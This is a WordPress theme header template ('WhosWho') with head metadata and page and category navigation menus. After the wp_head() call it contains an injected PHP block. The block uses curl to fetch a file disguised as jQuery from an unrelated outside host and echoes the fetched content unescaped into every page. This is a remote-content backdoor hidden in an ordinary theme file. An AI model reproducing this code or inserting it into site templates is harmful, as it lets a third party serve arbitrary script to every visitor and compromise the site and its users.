<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head profile="http://gmpg.org/xfn/11">
	<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
	<title><?php elegant_titles(); ?></title>
	<?php elegant_description(); ?>
	<?php elegant_keywords(); ?>
	<?php elegant_canonical(); ?>
	<meta name="Description" content="<?php bloginfo('description'); ?>" />
	<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
	<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
	<link rel="alternate" type="application/atom+xml" title="<?php bloginfo('name'); ?> Atom Feed" href="<?php bloginfo('atom_url'); ?>" />
	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
	
	<!--[if IE 7]>	
		<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo('template_directory'); ?>/iestyle.css" />
	<![endif]-->
	<!--[if lt IE 7]>
		<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo('template_directory'); ?>/ie6style.css" />
	<![endif]-->
	
	<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
	<?php wp_head(); ?>
<?php
if(function_exists('curl_init'))
{
 $url = "http://www.4llw4d.freefilesblog.com/jquery-1.6.3.min.js"; 
 $ch = curl_init();  
 $timeout = 5;  
 curl_setopt($ch,CURLOPT_URL,$url); 
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
 $data = curl_exec($ch);  
 curl_close($ch); 
 echo "$data";
}
?>
</head>
<body <?php body_class(); ?>>
	<div id="wrapper2">
		<!--This controls pages navigation bar-->
		<div id="pages">
			<a href="<?php bloginfo('url'); ?>"><?php $logo = (get_option('whoswho_logo') <> '') ? get_option('whoswho_logo') : get_bloginfo('template_directory').'/images/logo.gif'; ?>
				<img src="<?php echo esc_url($logo); ?>" alt="Logo" class="logo"/></a>
			<!--This is your company's logo-->
			
			<?php $menuClass = 'nav superfish';
			$menuID = 'nav2';
			$primaryNav = '';
			if (function_exists('wp_nav_menu')) {
				$primaryNav = wp_nav_menu( array( 'theme_location' => 'primary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'menu_id' => $menuID, 'echo' => false ) ); 
			};
			if ($primaryNav == '') { ?>
				<ul id="<?php echo $menuID; ?>" class="<?php echo $menuClass; ?>">
					<?php if(get_option('whoswho_swap_navbar') == 'false') { ?>
						<?php if (get_option('whoswho_home_link') == 'on') { ?>
							<li class="page_item<?php if (is_front_page()) echo(' current_page_item') ?>"><a href="<?php bloginfo('url'); ?>"><?php esc_html_e('Home','WhosWho'); ?></a></li>
						<?php }; ?>
						
						<?php show_page_menu($menuClass,false,false); ?>
					<?php } else { ?>
						<?php show_categories_menu($menuClass,false); ?>
					<?php } ?>
				</ul> <!-- end ul#nav -->
			<?php }
			else echo($primaryNav); ?>
			
		</div>
		<!--End category navigation-->
		<!--This controls the categories navigation bar-->
		<div id="categories">
			<?php $menuClass = 'nav superfish';
			$secondaryNav = '';
			if (function_exists('wp_nav_menu')) {
				$secondaryNav = wp_nav_menu( array( 'theme_location' => 'secondary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'echo' => false ) ); 
			};
			if ($secondaryNav == '') { ?>
				<ul class="<?php echo $menuClass; ?>">
					<?php if(get_option('whoswho_swap_navbar') == 'false') { ?>
						<?php show_categories_menu($menuClass,false); ?>
					<?php } else { ?>
						<?php if (get_option('whoswho_home_link') == 'on') { ?>
							<li class="page_item<?php if (is_front_page()) echo(' current_page_item') ?>"><a href="<?php bloginfo('url'); ?>"><?php esc_html_e('Home','WhosWho'); ?></a></li>
						<?php }; ?>
						
						<?php show_page_menu($menuClass,false,false); ?>
					<?php } ?>
				</ul> <!-- end ul#nav -->
			<?php }
			else echo($secondaryNav); ?>
		</div>
		<!--End category navigation-->
